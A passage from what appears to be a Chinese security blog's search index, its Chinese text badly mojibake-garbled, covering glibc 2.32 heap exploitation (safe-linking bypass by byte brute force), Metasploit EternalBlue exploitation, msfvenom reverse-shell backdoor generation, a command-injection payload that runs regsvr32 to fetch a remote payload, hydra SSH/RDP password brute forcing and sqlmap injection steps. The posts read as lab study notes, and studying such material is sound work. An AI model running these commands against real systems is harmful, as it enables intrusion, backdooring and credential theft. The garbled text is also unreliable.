NULL)\t\t\t\t\\\n\tbreak;\t\t\t\t\t\t\\\n\tpp = REVEAL_PTR (victim->fd);                                     \\\n\tif (__glibc_unlikely (pp != NULL && misaligned_chunk (pp)))       \\\n\tmalloc_printerr (\"malloc(): unaligned fastbin chunk detected\"); \\\n}\t\t\t\t\t\t\t\\\nwhile ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \\\n\t != victim);\t\t\t\t\t\\\n```\n\nç­‰å¤šå¤šå°‘å°‘ç”¨åˆ°tcacheå’Œfastbinçš„åœ°æ–¹ã€‚è€Œunsortebinã€largebinã€smallbinéƒ½ä¸ä¼šè¿›è¡Œç›¸å…³æŒ‡é’ˆå¼‚æˆ–ã€‚\n\n### (2)æ–°å¢æœºåˆ¶Safe-linkingçš„æ¼æ´\n\n#### â‘ è§„å¾‹æ€§\n\nå®˜æ–¹è¯´çš„æ˜¯\n\n```\n/* Safe-Linking:\nUse randomness from ASLR (mmap_base) to protect single-linked lists\nof Fast-Bins and TCache.  That is, mask the \"next\" pointers of the\nlists' chunks, and also perform allocation alignment checks on them.\nThis mechanism reduces the risk of pointer hijacking, as was done with\nSafe-Unlinking in the double-linked lists of Small-Bins.\nIt assumes a minimum page size of 4096 bytes (12 bits).  Systems with\nlarger pages provide less entropy, although the pointer mangling\nstill works.  */\n```\n\nåŸºäºASLRä¹‹åçš„å †åœ°å€ï¼Œå³Keyå€¼ä¸ºç¬¬ä¸€ä¸ªè¿›å…¥è¯¥å¤§å°TcacheBiné“¾çš„chunkçš„åœ°å€å³ç§»12bitå¾—åˆ°ï¼Œå¯¹äºFastbinä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n![Snipaste_2021-08-25_19-54-16](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213422.png)\n\n#### â‘¡ç‰¹æ®Šæ€§\n\nè™½è¯´FDè¢«åŠ å¯†ï¼Œä½†æ˜¯ç”±äºæ˜¯å¼‚æˆ–çš„å…³ç³»ï¼Œåœ¨UAFçš„ç‰¹æ®Šæ¡ä»¶ä¸‹å…¶å®æ˜¯å¯ä»¥æ§åˆ¶FDæŒ‡å‘å…¶ä»–å †å—çš„ã€‚\n\næ¯”å¦‚è¯´æˆ‘ä»¬è¿›è¡Œä¸€å®šçš„å †å¸ƒå±€ï¼Œå°è¯•å°†å †å—é›†ä¸­åœ¨0x100å†…ï¼Œç„¶åå¯ä»¥çˆ†ç ´1ä¸ªå­—èŠ‚æ¥è¿›è¡Œè®¡ç®—ï¼š\n\n![Snipaste_2021-08-25_17-50-30](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213439.png)\n\nè¿™é‡Œå°±chunk4->chunk3->chunk2->chunk1ã€‚\n\nè¿™é‡Œå°±å‡è®¾æˆ‘ä»¬çˆ†ç ´1å­—èŠ‚åå·²ç»çŸ¥é“äº†heapbase/0x1000å·¦ç§»12bitçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º0x59ã€‚ç°åœ¨è¿›è¡Œè®¡ç®—ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æŠŠchunk4çš„FDæŒ‡å‘chunk1åœ¨æ²¡æœ‰Leakçš„æƒ…å†µä¸‹åº”è¯¥æ€ä¹ˆä¿®æ”¹ï¼Ÿ\n\nè®¡ç®—0x10^0x59=0x49ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬åˆ©ç”¨UAFéƒ¨åˆ†å†™chunk4çš„FDçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x49ï¼Œé‚£ä¹ˆå®é™…ä¸Šå…¶å®æŒ‡å‘çš„å°±æ˜¯chunk1ã€‚è¿™ä¸ªåœ¨æ²¡æœ‰æ³„éœ²åœ°å€è€ŒSizeåˆåšé™åˆ¶å¯¼è‡´åªèƒ½ç”¨Fastbinå’ŒTcacheæ—¶ï¼Œå¯ä»¥é‡‡ç”¨è¿™ç§æ–¹æ³•çˆ†ç ´ã€‚æ‰€ä»¥å®é™…ä¸Šçš„æœŸæœ›åº”è¯¥æ˜¯1/256ï¼Œè¿™ä¸ªå°è¯•ä¸€ä¸‹åº”è¯¥å°±å¯ä»¥å®ç°çš„ã€‚\n\n### (3)æ–°å¢Tcacheåœ°å€å¯¹é½æ£€æŸ¥\n\n#### â‘ tcache_getä¸­\n\n```c\n//2.32\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n//2.31\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n```\n\nå¯ä»¥çœ‹åˆ°åœ¨tcache_getä¸­æ–°å¢äº†ä¸€ä¸ªæ£€æŸ¥\n\n```C\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n```\n\nè¿™ä¸ªå¯¼è‡´äº†æˆ‘ä»¬çš„tcacheä¸èƒ½ä»»æ„ç”³è¯·äº†ï¼Œ**å¿…é¡»æ˜¯0x10å¯¹é½çš„**ï¼Œè¿™ä¸ªå¯èƒ½ä¼šå¯¼è‡´ä¸å°‘çš„æ‰‹æ®µå˜åŒ–ã€‚\n\n#### â‘¡tcacheç»“æ„é‡Šæ”¾å‡½æ•°ä¸­\n\n```c\ntcache_thread_shutdown (void)\n{\n    int i;\n    tcache_perthread_struct *tcache_tmp = tcache;\n\n    if (!tcache)\n        return;\n\n    /* Disable the tcache and prevent it from being reinitialized.  */\n    tcache = NULL;\n    tcache_shutting_down = true;\n\n    /* Free all of the entries and the tcache itself back to the arena\n     heap for coalescing.  */\n    for (i = 0; i < TCACHE_MAX_BINS; ++i)\n    {\n        while (tcache_tmp->entries[i])\n        {\n            tcache_entry *e = tcache_tmp->entries[i];\n            if (__glibc_unlikely (!aligned_OK (e)))\n                malloc_printerr (\"tcache_thread_shutdown(): \"\n                                 \"unaligned tcache chunk detected\");\n            tcache_tmp->entries[i] = REVEAL_PTR (e->next);\n            __libc_free (e);\n        }\n    }\n\n    __libc_free (tcache_tmp);\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"tcache_thread_shutdown(): \"\n                     \"unaligned tcache chunk detected\");\n```\n\nå³å½“ç¨‹åºé€€å‡ºï¼Œé‡Šæ”¾tcacheç»“æ„ä½“æ—¶ä¼šåŠ å…¥å¯¹tcacheä¸­æ‰€æœ‰chunkè¿›è¡Œåœ°å€å¯¹é½æ£€æŸ¥ï¼Œä½†æ˜¯è¿™ä¸ªå¯¹exit()çš„æ”»å‡»æ²¡ä»€ä¹ˆå½±å“ã€‚\n\n#### â‘¢Tcacheä¸­double freeæ£€æŸ¥ä¸­\n\n```c\nif (__glibc_unlikely (e->key == tcache))\n{\n    tcache_entry *tmp;\n    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n    for (tmp = tcache->entries[tc_idx];\n         tmp;\n         tmp = REVEAL_PTR (tmp->next))\n    {\n        if (__glibc_unlikely (!aligned_OK (tmp)))\n            malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n        if (tmp == e)\n            malloc_printerr (\"free(): double free detected in tcache 2\");\n        /* If we get here, it was a coincidence.  We've wasted a\n\t   few cycles, but don't abort.  */\n    }\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (tmp)))\n    malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n```\n\nå½“tcacheè¿›è¡ŒFreeçš„double freeæ£€æŸ¥æ—¶ï¼Œå¦‚æœtcacheä¸­ç¬¬ä¸€ä¸ªbinçš„chunkåœ°å€ä¸å¯¹é½ï¼Œä¹Ÿä¼šé”™è¯¯ã€‚å…¶å®æœ€å¼€å§‹ä¸å¤ªç†è§£ï¼Œæƒ³è¿™èƒ½æœ‰å•¥ç”¨ï¼Œæœ€å¼€å§‹Freeçš„æ—¶å€™ä¸å°±å·²ç»è¿›è¡Œåœ°å€å¯¹é½æ£€æŸ¥äº†å—ã€‚åé¢æƒ³åˆ°ç”±äºstashingæœºåˆ¶ï¼Œå¯èƒ½ä¼šå°†åœ°å€ä¸åˆæ³•çš„Chunkæ”¾å…¥åˆ°tcacheä¸­ï¼Œæ‰€ä»¥å†è¿›è¡Œå¯¹åº”Binå¤§å°çš„chunké‡Šæ”¾æ—¶ï¼Œè¿›è¡Œæ£€æŸ¥æé«˜å®‰å…¨æ€§å§ã€‚**è¿™ä¸ªæˆ‘ä»¬åœ¨åˆ©ç”¨çš„æ—¶å€™ä¹Ÿéœ€è¦æ³¨æ„ä¸‹ï¼Œåˆ«åˆ°æ—¶å€™å¾—åˆ°äº†ç”¨Stashingæœºåˆ¶æ”¾å…¥ä¸€ä¸ªä¸åˆæ³•chunkä¹‹åå†freeå¯¼è‡´ç¨‹åºå‡ºé”™äº†ã€‚**\n\næƒ³æ„Ÿå¹ä¸€ä¸‹ï¼Œåœ¨2.31åŠä»¥ä¸‹ç‰ˆæœ¬ï¼Œåªæœ‰åœ¨_int_freeå‡½æ•°ä¸­æ‰æœ‰ä¸€ä¸ªåœ°å€å¯¹é½æ£€æŸ¥ï¼Œè¿™2.32çªç„¶åŠ äº†å¥½å‡ ä¸ªï¼ŒçœŸæ˜¯æŒºçŒ›çš„ã€‚\n\n\n\n## 2.UAFå¸¸è§é™åˆ¶\n\n### (1)UAF+Leak+Sizeä¸åšé™åˆ¶:\n\nè¿™ä¸ªå¦‚ä¸Šå›¾ä¸­å°±å¯ä»¥ç›´æ¥leakå‡ºchunk1çš„å†…å®¹å¾—åˆ°keyï¼Œç„¶åé‡Šæ”¾unsortedbin chunkæ³„éœ²libcåœ°å€åï¼Œåˆ©ç”¨keyå¼‚æˆ–å¯¹åº”åœ°å€å³å¯ä»»æ„ç”³è¯·ã€‚\n\n### (2)UAF+Leak+Sizeåšé™åˆ¶:\n\nä¸€æ ·çš„ï¼ŒLeakå‡ºkeyä¹‹åï¼Œä¿®æ”¹sizeå¾—åˆ°unsortedbin chunkä¹‹åæ³„éœ²libcåœ°å€ï¼Œå¼‚æˆ–æ”¹æ‰FDä»»æ„ç”³è¯·chunkã€‚\n\n### (3)UAF+æ— Leak+Sizeåšé™åˆ¶:\n\nè¿™æ¡ä»¶ä¸‹çš„æƒ³åŠå¤©å®åœ¨æ²¡æƒ³å‡ºæ¥ï¼Œçˆ†ç ´ä¸¤ä¸ªå­—èŠ‚å€’æ˜¯å¯ä»¥ç”³è¯·åˆ°Tcacheç»“æ„ä½“ï¼Œä½†æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„æœŸæœ›å´è¾¾åˆ°äº†0xffff=65535ï¼Œå®é™…çš„çº¿ä¸ŠCTFä¸­å¯èƒ½çˆ†å‡ºæ¥é»„èŠ±èœéƒ½å‡‰äº†ã€‚\n\nâ–²çˆ†ç ´ä¸¤å­—èŠ‚ç”³è¯·Tcache Structï¼š\n\næ¯”å¦‚æˆ‘ä»¬å…ˆçˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œä½¿å¾—heapbaseçš„åœ°å€ä¸º0xabcde5500000\n\nç„¶åæˆ‘ä»¬æŒ‰ç…§ä¸Šè¿°æ–¹æ³•ï¼Œç”¨ä¸€å®šå †å¸ƒå±€ï¼Œè®¡ç®—ä¸€ä¸‹åœ°å€\n\nå¼‚æˆ–ä¹‹åçš„åœ°å€åº”è¯¥ä¸ºï¼š\n\n```c\nchunk1:\t\t\t\t0xabcde5500400 ^ 0xabcde5500 = 0x--(0x0400^0x5500)\nTcacheStruct:\t\t0xabcde5500000 ^ 0xabcde5500 = 0x--(0x0000^0x5500)\n```\n\né‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¯¥æŒ‡å‘chunk1åœ°å€çš„æœ€åä¸¤ä¸ªå­—èŠ‚ä¸º5500å³å¯æŒ‡å‘Tcacheç»“æ„ä½“ï¼Œç„¶åé‡Šæ”¾è¿›å…¥unsortedbinè¸©ä¸‹libcåœ°å€å†çˆ†ç ´ç”³è¯·stdoutæ³„éœ²åœ°å€ï¼Œè¿™æ ·åˆä¼šå‡ºæ¥åŠä¸ªå­—èŠ‚çˆ†ç ´ç©ºé—´ã€‚å³0xfffff=1048575ï¼Œç›´æ¥GGã€‚\n\nâ–²sizeåšé™åˆ¶å…¶å®æ²¡å·®åˆ«ï¼Œå¯ä»¥çˆ†ç ´ä¸€ä¸ªå­—èŠ‚æ¥ä¿®æ”¹çš„ã€‚\n\n\n\n# æ€»ç»“\n\nè¿™æ¬¡æ€»ç»“å †åˆ©ç”¨æ–¹æ³•è®©æˆ‘ä¹Ÿå­¦åˆ°äº†å¥½å¤šï¼Œç¿»äº†å¥½å¤šæºç ï¼Œå¾ˆå¤šä»¥å‰ä¸æ˜æ‰€ä»¥çš„ä¸œè¥¿ç¿»äº†ç›¸å…³æºç ä¹‹åæ„Ÿè§‰ä¸€ä¸‹å­å°±æ¸…æ¥šäº†ã€‚\n\nè¿™ç¯‡æ–‡ç« æŒç»­æ›´æ–°ï¼Œä»¥åå†å‘ç°æœ‰æ„æ€çš„åœ°æ–¹å†å›æ¥æ›´æ–°ã€‚\n\nå½“ç„¶ï¼ŒUAFå…¶å®æ˜¯ç‰¹åˆ«å¥½åˆ©ç”¨çš„ä¸€ç§ï¼Œé«˜ç‰ˆæœ¬ä¸‹ä¹Ÿå¯¹åº”æœ‰å¾ˆå¤šçš„éªšæ“ä½œï¼Œæ¯”å¦‚\n\n`house of pig` :https://www.anquanke.com/post/id/242640\n\n`house of banana` :https://www.anquanke.com/post/id/222948\n\nç­‰ç­‰ç°åœ¨å¤§å¤šçš„é¢˜ç›®éƒ½æ˜¯off by null + å †å¸ƒå±€ï¼Œå°¤å…¶æ˜¯å †å¸ƒå±€è¿™ä¸€å—ï¼Œå®åœ¨æ˜¯æ— æ¯”è€ƒéªŒå¯¹å †çš„ç†è§£ï¼Œå› ä¸ºä¸‡ä¸€å…¶ä¸­å“ªä¸ªåœ°æ–¹æƒ³é”™ï¼Œç›´æ¥å°±å¾—æ¨å€’é‡æ¥ã€‚\n\nåé¢æ‰¾æ—¶é—´å†æ€»ç»“ä¸‹off by nullå§ã€‚\n\n","tags":["Heap"],"categories":["PWN","pwnå †-UAF"]},{"title":"1.metasploit-win7æ°¸æ’ä¹‹è“-ms17_010å¤ç°","url":"/2021/08/19/1.metasploit-win7æ°¸æ’ä¹‹è“-ms17_010å¤ç°/","content":"\nå¼€äº†é˜²ç«å¢™çš„è¯å¯èƒ½éƒ½pingä¸é€šï¼Œéœ€è¦å„ç§ç»•è¿‡\n\nä¸€ã€å‰æœŸå·¥ä½œï¼š\n\n1.é¦–å…ˆä¿¡æ¯æ”¶é›†ï¼Œè·å–çœŸå®IPï¼Œç„¶åæ‰«æï¼Œå¾ˆå¤šç§ï¼Œå‚æ•°å¤ªå¤šï¼š\n\nnmap -O -p445 ipï¼šæ£€æŸ¥æ˜¯å¦å¼€å¯445ç«¯å£åŠä¸»æœºæ“ä½œç³»ç»Ÿ\n\ndb_nmap -sT -T4 ipï¼šå¿«é€Ÿæ‰«æï¼Œdbæ˜¯database\n\n2.ç„¶åçœ‹æœ‰æ²¡æœ‰æ¼æ´ï¼Œéœ€è¦å¯¹æ¼æ´æœ‰ä¸€å®šæŒæ¡\n\n3.åœ¨metasploitä¸‹æŸ¥æ‰¾æ¼æ´çš„ä½¿ç”¨æ¨¡å—å’Œæ‰«ææ¨¡å—ç­‰ï¼Œä¸‹é¢åˆ©ç”¨win7çš„æ°¸æ’ä¹‹è“æ¼æ´ï¼š\n\nsearch ms17_011ï¼šæŸ¥æ‰¾è¯¥æ¼æ´çš„ç›¸å…³\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510199.png)\n\n4.å…ˆä½¿ç”¨è¯¥æ¨¡å—æ‰«æçœ‹çœ‹æœ‰æ²¡æœ‰è¯¥æ¼æ´ï¼š\n\n(1)è¿›å…¥æ¨¡å—å¹¶ä¸”é…ç½®æ¨¡å—ä¿¡æ¯ï¼š\n\nuse auxiliary/scanner/smb/smb_ms17_010\n\nshow options\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509941.png)\n\nset RHOSTS ip\n\n(2)ä½¿ç”¨è¯¥æ¨¡å—æ¥æ‰«æï¼š\n\nrunæˆ–è€…exploit\n\n \n\næ£€æµ‹åˆ°å¯èƒ½æœ‰ï¼Œé‚£ä¹ˆä½¿ç”¨æ”»å‡»æ¨¡å—ï¼š\n\n5.ä½¿ç”¨æ”»å‡»æ¨¡å—è¿›è¡Œæ”»å‡»ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509097.png)\n\nset RHOSTS ip\n\nexploit\n\n6.å¾—åˆ°ç›®çš„ä¸»æœºçš„shellï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509506.png)\n\n7.ä¸ºäº†ä¸ä¹±ç ï¼Œè®¾ç½®ç¼–ç æ ¼å¼ä¸ºutf-8ï¼š\n\nchcp 65001\n\n8.è°ƒæ¢è‡³åå°ï¼Œè¾“å…¥sessionså¯ä»¥æŸ¥çœ‹ï¼Œsessions idå¯ä»¥è¿›å…¥ï¼š\n\nbackground\n\nsessions\n\nsessions id\n\n9.ä¸ºäº†æ›´å¥½åˆ©ç”¨ï¼Œè°ƒæ¢è‡³meterpreteræ¨¡å¼ï¼š\n\nsessions -u 1\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509822.png)\n\n \n\n \n\näºŒã€ç”Ÿæˆåé—¨ç¨‹åºä¼ åˆ°åœ¨ç›®æ ‡æœºå™¨ä¸Šï¼Œè¿™æ ·ä¸‹å›ç›®æ ‡æœºå™¨è¿è¡Œè¯¥ç¨‹åºï¼Œä¸»æœºç›‘å¬åˆ°ä¹‹åå°±å¯ä»¥ç›´æ¥è¿›å…¥äº†ï¼Œä¸ç®¡æ¼æ´åœ¨ä¸åœ¨ã€‚\n\n1.ç”Ÿæˆåé—¨ç¨‹åºï¼š\n\nâ‘ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f exe > localmsf8881.exe\n\nâ‘¡msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.py\n\nâ‘¢msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.php\n\nå¯ä»¥ç”Ÿæˆå¾ˆå¤šç§åé—¨ç¨‹åºï¼Œåªè¦åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨\n\n2.æœ¬æœºä¸Šä½¿ç”¨æ¨¡å—ï¼Œè®¾ç½®payloadå’Œç›‘å¬ç«¯å£ï¼š\n\nuse exploit/multi/handler\n\nset payload windows/meterpreter/reverse_tcp\n\nset LHOST 192.168.80.158\n\nset LPORT 8881\n\nrun\n\n3.ç°åœ¨å¦‚æœé¶æœºä¸Šè¿è¡Œlocalmsf8881ï¼Œå°±ä¼šä¼ å›ä¿¡æ¯ç»™ä¸»æœºï¼Œä¸»æœºä¸Šçš„è¿™ä¸ªå‘½ä»¤è¡Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªmeterpreterçš„sessionï¼Œä¹‹åå°±å¯ä»¥è¿›å…¥äº†\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510616.png)\n","tags":["WEB"],"categories":["WEB"]},{"title":"2.metasploit-éƒ¨åˆ†å‘½ä»¤æ‰§è¡Œè·å–æƒé™","url":"/2021/08/19/2.metasploit-éƒ¨åˆ†å‘½ä»¤æ‰§è¡Œè·å–æƒé™/","content":"\nä¸€ã€å‰æœŸè¿è¡Œï¼šwebä¸­ï¼Œå½“å¯ä»¥è¾“å…¥æŸäº›æŸ¥è¯¢æ¡†æ—¶ï¼Œè¯¥è¾“å…¥ä¼šè¢«è¿è¡Œåœ¨å‘½ä»¤è¡Œä¸­ï¼Œä¾‹å¦‚pingå‘½ä»¤ã€‚(DVWA)\n\n1.webè¦æ±‚è¾“å…¥ipåœ°å€ï¼Œç»æ£€æŸ¥å¯ä»¥å‘ç°è¾“å…¥çš„å†…å®¹ä¼šè¢«å®Œæ•´è¿è¡Œåˆ°æœåŠ¡å™¨çš„å‘½ä»¤è¡Œä¸‹ã€‚\n\nä¾‹å¦‚è¾“å…¥127.0.0.1 && whoamiï¼Œwebåé¦ˆçš„ä¿¡æ¯é™¤äº†ping 127.0.0.1ï¼Œè¿˜ä¼šå°†whoamiè¿™ä¸ªå‘½ä»¤çš„ä¿¡æ¯ç»™è¿”å›ã€‚\n\n2.åœ¨Msfconsleä¸­ä½¿ç”¨web_delivreryæ¨¡å—use exploit/multi/script/web_deliveryï¼Œä¹‹åè®¾ç½®å¯¹åº”å‚æ•°ï¼š\n\n(1)è®¾ç½®targetï¼Œéœ€è¦ç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰å¯¹åº”è„šæœ¬è¯­è¨€ï¼Œä½¿å¾—ç›®æ ‡æœåŠ¡å™¨ä¸Šèƒ½å¤Ÿè¿è¡Œæˆ‘ä»¬æ³¨å…¥çš„å‘½ä»¤ï¼Œæ‰“ä¸åŠ¨å°±ä»£è¡¨æ²¡æœ‰ï¼Œæˆ–è€…æ²¡æœ‰å†™å…¥ç¯å¢ƒå˜é‡ç­‰ç­‰åŸå› ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506647.png)\n\nè¿™é‡Œé€‰æ‹©ç›®æ ‡è¯­è¨€ä¸ºRegsvr32\n\n(2)æŸ¥çœ‹è¿˜éœ€è¦çš„é…ç½®ï¼Œé…ç½®ä¸€ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505056.png)\n\nè¿™é‡Œçš„lhostå°±æ˜¯æ”»å‡»æ–¹çš„ip\n\n(3)è®¾ç½®æ”»å‡»è½½è·ï¼Œç”Ÿæˆæ³¨å…¥å‘½ä»¤ï¼š\n\nset payload windows/meterpreter/reverse_tcp  (ä½¿ç”¨windowsçš„meterpreterï¼Œå»ºç«‹è¿æ¥reverse_tcp)\n\nç„¶åå°±ä¼šç”Ÿæˆå‘½ä»¤ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505298.png)\n\nè¿™å°±ä»£è¡¨æˆ‘ä»¬éœ€è¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š\n\nregsvr32 /s /n /u /i:http://192.168.80.159:8080/IVJqvpIJSzu.sct scrobj.dll\n\næ­¤æ—¶msfconsoleå°±ä¼šè¿›å…¥åœæ»çŠ¶æ€ï¼Œä¸€æ—¦æ£€æŸ¥åˆ°æœ‰ç›®æ ‡æœåŠ¡å™¨è¿è¡Œäº†ä¸Šè¿°å‘½ä»¤ï¼Œå°±ä¼šç”Ÿæˆmeterpreterè¿æ¥ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png)\n\næ‰“ä¸é€šå¯èƒ½æ˜¯é˜²ç«å¢™æˆ–è€…æ€æ¯’è½¯ä»¶ä¹‹ç±»çš„å…³ç³»\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"3.å¼±å£ä»¤å¯†ç ç ´è§£ç™»å½•","url":"/2021/08/19/3.å¼±å£ä»¤å¯†ç ç ´è§£ç™»å½•/","content":"\n1.åˆ¶ä½œå­—å…¸ï¼š\n\n(1)åˆ©ç”¨cewlåˆ¶ä½œï¼š\n\ncewl -d 2 -m 5 -w word.txt [www.baidu.com](http://www.baidu.com)\n\n(d:deepthï¼Œçˆ¬å–å±‚æ•°\n\nm:....æ€§èƒ½ï¼Œè®¾ç½®è¶Šå¤§çˆ¬å–è¶Šå¿«)\n\n(2)åˆ©ç”¨å·¥å…·åˆ¶ä½œï¼š\n\nhttp://www.bugku.com/mima/ è¾“å…¥ç›¸åº”ä¿¡æ¯å³å¯ç”Ÿæˆ\n\n(3)åˆ©ç”¨githubä¸Šçš„å·¥å…·ï¼š\n\nhttps://github.com/TheKingOfDuck/fuzzDicts\n\nhttps://github.com/fuzzdb-project/fuzzdb\n\nâ–²ç”Ÿæˆçš„å­—å…¸å¯èƒ½æœ‰ä¸­æ–‡ï¼Œä½¿ç”¨%s/\\v[^\\x00-\\xff]+//gæ¥å¼ºåˆ¶åˆ é™¤ä¸­æ–‡[^\\x00-\\xff]å³ä¸­æ–‡çš„è¡¨ç¤ºï¼ŒåŒå­—èŠ‚å­—ç¬¦\n\n \n\n2.åˆ©ç”¨å­—å…¸çˆ†ç ´SSH/RDP:\n\n(1)å…ˆæ‰«ææ˜¯å¦å¼€å¯äº†sshç«¯å£ï¼š\n\nnmap -sT -T4 ipï¼šå¿«é€Ÿæ‰«æ\n\n(1)ä½¿ç”¨hydra:\n\nå‚æ•°è®¾ç½®:\n\n-l(Login)ï¼šæƒ³è¦ç ´è§£çš„ç”¨æˆ·ï¼Œä¾‹å¦‚root\n\n-L(FILE)ï¼šæŒ‡å®šç”¨æˆ·åå­—å…¸\n\n-p(pass)ï¼šæŒ‡å®šå¯†ç ï¼Œå¦‚æœæœ‰å¯†ç è¿˜çˆ†ç ´å¹²å•¥\n\n-P(FILE)ï¼šæŒ‡å®šå¯†ç å­—å…¸\n\n-s(PORT)ï¼šæŒ‡å®šçˆ†ç ´ç«¯å£\n\n-M(FILE)ï¼šæŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶ï¼Œå¦‚æœæœ‰å¤šä¸ªIPç›®æ ‡éœ€è¦æ”»å‡»ï¼Œå¯ç”¨æ¥æŒ‡å®š\n\n-C(FILE)ï¼š\n\n-f ï¼šä½¿ç”¨-Må‚æ•°åï¼Œæ‰¾åˆ°ç¬¬ä¸€ç™»å½•åå’Œå¯†ç å³ç»ˆæ­¢\n\nâ–²hydra -l root -p root 127.0.0.1 -s 2222 ssh -fï¼šç”¨rootå¯†ç ç™»å½•rooté€šè¿‡ssh\n\nâ–²hydra -l root -P word.txt 127.0.0.1 -s 2222 -f ssh\n\nâ–²hydra -l administrator -P word.txt 127.0.0.1 rdp(ç±»ä¼¼windowsä¸‹çš„ssh)\n\nâ˜…å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„å¯†ç å­—å…¸å°è¯•ï¼š\n\nç›®å½•åœ¨/usr/share/wordlists/metasploit/ä¸‹ï¼Œæœ‰å¾ˆå¤šå­—å…¸å¯†ç \n\n(2)ä½¿ç”¨msfæ”»å‡»\n\nâ‘ æœç´¢ä¸€ä¸‹ï¼šsearch login //loginç­‰ç­‰\n\nâ‘¡é€šè¿‡æŸ¥æ‰¾åˆ°çš„ä½¿ç”¨è¯¥æ¨¡å—ï¼šuse auxiliary/scanner/ssh/ssh_login\n\nâ‘¢show optionsçœ‹ä¸€ä¸‹éœ€è¦è®¾ç½®ä»€ä¹ˆä¿¡æ¯ï¼Œè®¾ç½®ipï¼Œç”¨æˆ·åï¼Œå¯†ç å­—å…¸ï¼Œç«¯å£ï¼Œçˆ†ç ´çº¿ç¨‹æ•°é‡ç­‰ä¿¡æ¯ï¼Œç„¶åç›´æ¥runå³å¯ã€‚\n\nset RHOST/USERNAME/PASS_FILE/RPORT/THREADSç­‰ç­‰\n\n \n\n3.Burp(burpsuite)çˆ†ç ´åå°å¯†ç ï¼š(è¿˜æ²¡å­¦)\n\n \n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"4.SQLæ³¨å…¥","url":"/2021/08/19/4.SQLæ³¨å…¥/","content":"\nä¸€ã€SQLæ³¨å…¥ï¼š\n\n1.å¸¸ç”¨å‘½ä»¤ï¼š\n\n \n\n2.SQLMAPä½¿ç”¨ï¼š\n\n(1)å‰ç½®äº†è§£ï¼š\n\nå®˜æ–¹ç½‘å€ï¼šhttp://sqlmap.org\n\nGithubç½‘å€ï¼šhttps://github.com/sqlmapproject/sqlmap\n\nhttps://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md\n\nä½¿ç”¨æ‰‹å†Œï¼šhttps://github.com/sqlmapproject/sqlmap/wiki/Usage\n\n(2)å¸¸ç”¨ç±»å‹ï¼š\n\nâ–²åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼šGETå‹\n\næ”»å‡»æµç¨‹ï¼š\n\nâ‘ æµ‹è¯•ç›®æ ‡æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ï¼šsqlmap -u ip\n\nè¿™é‡Œå°±å¯èƒ½ä¼šè¿”å›payloadï¼Œå¯ä»¥ç”¨æ¥è‡ªå®šä¹‰ä½¿ç”¨\n\nâ‘¡ä¹‹åæŸ¥æ‰¾æ‰€æœ‰databaseï¼šsqlmap -u ip --dbs\n\nâ‘¢æŸ¥æ‰¾æ‰€æœ‰tablesï¼šsqlmap -u ip --tables\n\nâ‘£æŸ¥æ‰¾å­˜å‚¨çš„å±æ€§å­—æ®µï¼šsqlmap -u ip -D database_name -T table_name 